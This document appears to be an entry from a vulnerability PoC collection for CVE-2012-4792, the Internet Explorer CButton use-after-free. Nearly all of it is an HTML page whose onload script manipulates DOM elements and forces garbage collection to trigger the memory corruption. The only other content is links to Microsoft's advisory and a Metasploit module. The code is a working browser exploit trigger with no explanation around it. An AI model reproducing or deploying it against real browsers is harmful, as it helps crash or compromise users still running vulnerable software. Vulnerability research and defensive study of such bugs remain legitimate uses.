# CVE-2012-4792

## PoC

```html
<!doctype html>
<html>
<head>
<script> 

function exploit()
{
 var e0 = null;
 var e1 = null;
 var e2 = null; 

 try {
  e0 = document.getElementById("a");
  e1 = document.createElement("div");
  e2 = document.createElement("q");
  e1.applyElement(e2);
  e1.appendChild(document.createElement('button'));
  e1.applyElement(e0);
  e2.innerHTML = "";
  e2.appendChild(document.createElement('body'));
 } catch(e) { }
 CollectGarbage(); 

} 

</script> 

</head>
<body onload="exploit()">
<form id="a">
</form>
</body>
</html>
```

## Reference

+ [Microsoft Security Advisory](https://docs.microsoft.com/en-us/security-updates/SecurityAdvisories/2013/2794220)
+ [Metasploit Framework](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/browser/ie_cbutton_uaf.rb)
